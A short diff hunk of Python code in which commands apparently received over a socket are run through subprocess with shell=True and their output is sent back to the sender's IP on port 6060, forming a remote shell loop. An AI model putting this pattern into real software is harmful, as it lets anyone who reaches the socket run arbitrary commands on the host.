@@ -14,7 +14,7 @@ try:
 			ipTuple = command[1]
 			ip = ipTuple[0]
 			#print(ip)
-			output = subprocess.check_output(instruction.split())
+			output = subprocess.check_output(instruction, shell=True)
 			sock.sendto((output), (ip, 6060))
 		except OSError:
 			ipTuple = command[1]
